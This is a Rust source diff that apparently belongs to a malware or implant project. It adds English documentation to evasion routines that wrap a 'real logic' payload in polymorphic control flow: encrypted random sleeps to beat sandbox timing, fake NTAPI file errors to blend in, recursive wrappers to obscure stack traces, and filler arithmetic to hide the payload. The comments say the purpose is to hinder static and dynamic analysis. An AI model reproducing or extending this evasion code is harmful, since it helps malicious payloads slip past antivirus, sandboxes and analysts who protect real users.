@@ -5,7 +5,14 @@ use rand::Rng;
 use crate::{evasion::anti_debug::encrypted_sleep, execute_real_logic, native::{call::NativeAPI, file_ops::nt_file_exists}};
 
     
-    /// Exécuter le code avec un flow polymorphique
+/// Execute a given function using a polymorphic control flow strategy.
+/// 
+/// This method randomly chooses from a set of evasion patterns designed
+/// to alter the execution path and hinder static or dynamic analysis.
+/// Each path applies different types of noise or control flow variation.
+/// 
+/// The supplied `func` is not executed directly—instead, it's wrapped in one
+/// of several flow obfuscation patterns to increase complexity.
 pub fn polymorphic_execute<F>(func: F) 
     where
         F: FnOnce() + Send + 'static,
@@ -22,18 +29,21 @@ pub fn polymorphic_execute<F>(func: F)
     }
 
 
-    
+/// Flow variant #1: Adds random delays before and after execution.
+/// 
+/// This technique simulates natural processing time, making sandbox timing
+/// analysis harder. It also introduces some meaningless arithmetic between sleeps.
 fn execute_with_delays<F>(func: F)
     where
         F: FnOnce() + Send + 'static,
     {
         let mut rng = rand::thread_rng();
         
-        // Délais aléatoires avant/après
+        // Introduce random short delays with filler computation
         for _ in 0..rng.gen_range(1..4) {
             encrypted_sleep(rng.gen_range(1..50));
             
-            // Petits calculs entre les délais
+            // Dummy calculation to increase instruction count
             let mut x = 0u64;
             for i in 0..100 {
                 x = x.wrapping_add(i);
@@ -42,32 +52,34 @@ fn execute_with_delays<F>(func: F)
         let _ = execute_real_logic();
         let _ = func;
         
-        // Délais après
+
         encrypted_sleep(rng.gen_range(10..100));
     }
 
 
 
-    
+/// Flow variant #2: Simulates benign system errors using NTAPI.
+/// 
+/// This variant introduces fake system failures like missing files,
+/// which can mimic behavior of legitimate applications encountering I/O issues.
+/// These "errors" are meant to blend in with expected noise in real software.   
 fn execute_with_fake_errors<F>(func: F)
 where
     F: FnOnce() + Send + 'static,
 {
-    // Simuler des erreurs avec NTAPI
     unsafe {
         if let Ok(native_api) = NativeAPI::new() {
-            // Vérifier si un fichier n'existe pas (simule une erreur)
+            // Simulate invalid file access (expected to fail)
             let _ = nt_file_exists(&native_api, "C:\\This\\Does\\Not\\Exist.fake");
             
-            // Autre exemple: essayer de se connecter à une IP invalide
-            // (si tu as implémenté nt_tcp_connect)
+            // Execute core logic mid-way through "error-handling"
             let _ = execute_real_logic();
             let _ = func;
             
-            // Plus d'erreurs factices
+            // Another fake I/O call
             let _ = nt_file_exists(&native_api, "C:\\Fake\\Path\\To\\Nothing.xyz");
         } else {
-            // Fallback si NativeAPI échoue
+            // If NTAPI resolution fails, fallback to just running the closure
             let _ = func;
         }
     }
@@ -75,7 +87,10 @@ where
 
 
 
-    
+/// Flow variant #3: Wraps execution in recursive layers to obfuscate stack traces.
+/// 
+/// Deep call stacks with non-linear depth make it harder for debuggers and analyzers
+/// to identify the real execution point. Includes useless arithmetic to burn cycles.   
 fn execute_with_recursion<F>(func: F)
     where
         F: FnOnce() + Send + 'static,
@@ -88,13 +103,13 @@ fn execute_with_recursion<F>(func: F)
                 let _ = execute_real_logic();
                 let _ = func;
             } else {
-                // Faire un calcul inutile
+                // Arbitrary calculation to pad the stack frame
                 let mut x = depth as u64;
                 for i in 0..10 {
                     x = x.wrapping_mul(i + 1);
                 }
                 
-                // Rappeler avec une closure qui appelle func
+                // Recurse with reduced depth
                 recursive_wrapper(depth - 1, func);
             }
         }
@@ -105,18 +120,20 @@ fn execute_with_recursion<F>(func: F)
 
 
 
-    
+/// Flow variant #4: Executes the logic up front, followed by meaningless operations.
+/// 
+/// This breaks expectations that side effects always happen last, which can confuse
+/// naive instrumentation. Includes loop-based filler and delays to mask the payload.   
 fn execute_with_jumps<F>(func: F)
 where
     F: FnOnce() + Send + 'static,
 {
-    // Exécuter directement d'abord
+    // Real logic is triggered first
     let _ = execute_real_logic();
     
-    // Puis faire du bruit après
+    // Followed by noisy computation and timing
     let mut rng = rand::thread_rng();
     
-    // Faire des calculs factices
     for _ in 0..rng.gen_range(3..8) {
         let mut x = 0u64;
         for j in 0..100 {
